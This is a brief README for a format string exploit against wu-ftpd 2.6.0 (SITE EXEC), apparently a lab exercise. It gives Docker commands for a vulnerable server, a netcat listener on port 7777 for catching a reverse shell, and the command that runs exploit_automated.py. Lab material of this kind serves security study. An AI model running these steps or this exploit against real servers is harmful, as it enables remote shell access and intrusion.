# wu-ftpd 2.6.0 SITE EXEC Format String Exploit

```sh
# wu-ftpd 2.6.0, in one terminal
docker run --privileged -it --rm -p 21:21 smuxcs/wu-ftpd-32-shellcode-canary-aslr:2.6.0

# Ubuntu or any other OS, in another terminal
docker run -it --rm ubuntu:latest # for getting a reverse shell, ensure this container has an IP of 172.17.0.5 or change the shellcode in exploit_automated.py
apt-get install netcat
nc -lvnp 7777 # listen on TCP 7777, if you want to change, change the shellcode in exploit_automated.py

# On host machine, in another terminal
./exploit_automated.py localhost 21
```
